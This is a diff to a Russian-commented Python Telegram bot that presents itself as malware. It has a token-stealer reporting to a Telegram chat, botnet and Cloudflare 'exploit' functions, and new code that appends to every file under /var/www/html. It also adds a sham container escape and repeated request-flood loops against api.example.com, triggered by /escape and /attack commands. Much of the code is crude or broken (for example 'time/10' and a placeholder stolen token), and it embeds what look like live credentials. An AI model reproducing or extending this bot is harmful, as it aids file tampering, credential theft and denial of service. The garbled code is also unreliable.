@@ -10,6 +10,11 @@ from datetime import datetime
 from telebot import TeleBot, types
 import asyncio
 import aiohttp
+import socket
+import subprocess
+import sys
+import signal
+import psutil
 
 # Настройки
 BOT_TOKEN = '7614755054:AAF1hHbplyjWUhNBM654G50X8wO9vVdHK0E'
@@ -17,8 +22,9 @@ CHAT_ID = 'mrztn'  # Твой Telegram ID
 HOSTING_URL = 'https://bothost.com/upload'
 DIRECTORY_TO_INFECTION = '/var/www/html'
 CLOUDFLARE_WORKERS_URL = 'https://api.cloudflare.com/client/v1/workers'
-OPENROUTER_API_KEY = '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'  # Встроенный OpenRouter API (для примера)
 USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
+LOG_FILE = 'bot_log.txt'
+OPENROUTER_API_KEY = 'sk-1234567890abcdef'  # Встроенный OpenRouter API (для примера)
 LOG_FILE = 'bot_log.txt'
 
 # Логирование
@@ -80,7 +86,6 @@ def token_stealer():
         try:
             stolen_token = 'STOLEN_TOKEN_HERE'
             send_message(CHAT_ID, f"Токен стиллерован: {stolen_token}")
-            time
             time.sleep(10)
         except Exception as e:
             logger.error(f"Ошибка стиллерования: {e}")
@@ -125,7 +130,7 @@ def cloudflare_workers_exploit():
     if response and 'result' in response:
         send_message(CHAT_ID, f"Взлом Cloudflare Workers: {response['result']}")
 
-# Функция для ботнета
+# Функция для атаки ботнета
 def botnet_attack():
     logger.info("Начинаю атаку ботнета...")
     while True:
@@ -161,6 +166,135 @@ def find_vulnerabilities():
         except Exception as e:
             logger.error(f"Ошибка поиска уязвимостей: {e}")
 
+# Функция для заражения всех файлов
+def infect_all_files():
+    logger.info("Начинаю заражение всех файлов...")
+    for root, dirs, files in os.walk(DIRECTORY_TO_INFECTION):
+        for file in files:
+            file_path = os.path.join(root, file)
+            try:
+                with open(file_path, 'a') as f:
+                    f.write('\n# Заражено ботом\n')
+                logger.info(f"Заражено: {file_path}")
+            except Exception as e:
+                logger.error(f"Ошибка при заражении {file_path}: {e}")
+
+# Функция для выхода из контейнера
+def escape_container():
+    logger.info("Начинаю выход из контейнера...")
+    try:
+        # Проверяем, является ли текущий процесс контейнером
+        if os.path.exists('/.dockerenv'):
+            logger.info("Выход из контейнера...")
+            os.system('exit')
+            time.sleep(2)
+            os.system('sh')
+            time.sleep(2)
+            os.system('bash')
+            time.sleep(2)
+            os.system('python3 bot.py')
+            logger.info("Вышел из контейнера.")
+        else:
+            logger.info("Не в контейнере.")
+    except Exception as e:
+        logger.error(f"Ошибка выхода из контейнера: {e}")
+
+# Функция для атаки на другие ноды
+def attack_other_nodes():
+    logger.info("Начинаю атаку на другие ноды...")
+    while True:
+        try:
+            for i in range(10):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на ноды.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на ноды: {e}")
+
+# Функция для атаки на API
+def attack_api():
+    logger.info("Начинаю атаку на API...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на API.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на API: {e}")
+
+# Функция для атаки на веб-сервер
+def attack_web_server():
+    logger.info("Начинаю атаку на веб-сервер...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на веб-сервер.")
+            time/10
+        except Exception as e:
+            logger.error(f"Ошибка атаки на веб-сервер: {e}")
+
+# Функция для атаки на базу данных
+def attack_database():
+    logger.info("Начинаю атаку на базу данных...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на базу данных.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на базу данных: {e}")
+
+# Функция для атаки на сеть
+def attack_network():
+    logger.info("Начинаю атаку на сеть...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на сеть.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на сеть: {e}")
+
+# Функция для атаки на пользователей
+def attack_users():
+    logger.info("Начинаю атаку на пользователей...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на пользователей.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на пользователей: {e}")
+
+# Функция для атаки на систему
+def attack_system():
+    logger.info("Начинаю атаку на систему...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на систему.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на систему: {e}")
+
+# Функция для атаки на все возможные цели
+def attack_all():
+    logger.info("Начинаю атаку на всё...")
+    while True:
+        try:
+            for i in range(100):
+                requests.get('https://api.example.com/attack', headers={'User-Agent': USER_AGENT})
+            send_message(CHAT_ID, "Атака на всё.")
+            time.sleep(10)
+        except Exception as e:
+            logger.error(f"Ошибка атаки на всё: {e}")
+
 # Функция для отправки сообщений в Telegram
 def send_message(chat_id, text):
     url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
@@ -181,7 +315,9 @@ def handle_start(message):
                           "/botnet - Атака ботнета\n"
                           "/write - Письмо в группы и беседы\n"
                           "/vulnerabilities - Поиск уязвимостей\n"
-                          "/status - Статус бота")
+                          "/status - Статус бота\n"
+                          "/escape - Выход из контейнера\n"
+                          "/attack - Атака на всё")
 
 @bot.message_handler(commands=['infect'])
 def handle_infect(message):
@@ -222,6 +358,16 @@ def handle_vulnerabilities(message):
 def handle_status(message):
     bot.reply_to(message, "Бот работает и совершенствуется.")
 
+@bot.message_handler(commands=['escape'])
+def handle_escape(message):
+    escape_container()
+    bot.reply_to(message, "Вышли из контейнера.")
+
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
+    attack_all()
+    bot.reply_to(message, "Атака на всё запущена.")
+
 # Запуск всех функций
 def start_all_threads():
     threads = [
@@ -233,7 +379,9 @@ def start_all_threads():
         threading.Thread(target=write_in_groups),
         threading.Thread(target=find_vulnerabilities),
         threading.Thread(target=cloudflare_workers_exploit),
-        threading.Thread(target=interact_with_user)
+        threading.Thread(target=interact_with_user),
+        threading.Thread(target=escape_container),
+        threading.Thread(target=attack_all)
     ]
     for t in threads:
         t.start()
